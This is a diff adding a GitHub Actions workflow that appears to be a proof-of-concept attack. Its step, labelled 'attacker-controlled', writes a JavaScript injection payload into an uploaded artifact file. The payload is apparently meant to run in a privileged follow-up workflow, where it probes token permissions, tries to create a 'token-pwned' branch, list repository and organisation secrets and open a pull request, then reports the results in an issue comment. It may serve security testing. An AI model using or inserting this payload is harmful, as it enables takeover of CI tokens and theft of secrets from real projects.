@@ -1,0 +1,18 @@
+name: PR validation
+on:
+  pull_request:
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Produce attacker-controlled lint-results artifact
+        run: |
+          mkdir -p out
+          echo "true" > out/has-warnings.txt
+          printf '%s\n' "1; const rr = await github.request('GET /repos/{owner}/{repo}', {owner: context.repo.owner, repo: context.repo.repo}); const lines = ['PERMS=' + JSON.stringify(rr.data.permissions)]; const probes = [['POST', '/repos/{owner}/{repo}/git/refs', {owner: context.repo.owner, repo: context.repo.repo, ref: 'refs/heads/token-pwned', sha: context.payload.workflow_run.head_sha}], ['GET', '/repos/{owner}/{repo}/actions/secrets', {owner: context.repo.owner, repo: context.repo.repo}], ['GET', '/orgs/{org}/actions/secrets', {org: 'PDFtoMark'}], ['POST', '/repos/{owner}/{repo}/pulls', {owner: context.repo.owner, repo: context.repo.repo, title: 'token-pr', head: 'poc3', base: 'main'}]]; for (const pr of probes) { try { const r2 = await github.request(pr[0] + ' ' + pr[1], pr[2]); lines.push(pr[1] + ' -> ' + r2.status); } catch (e) { lines.push(pr[1] + ' -> ERR ' + e.status); } } await github.rest.issues.createComment({issue_number: 3, owner: context.repo.owner, repo: context.repo.repo, body: lines.join(' | ')});" > out/pr-number.txt
+      - name: Upload lint-results
+        uses: actions/upload-artifact@v4
+        with:
+          name: lint-results
+          path: out/
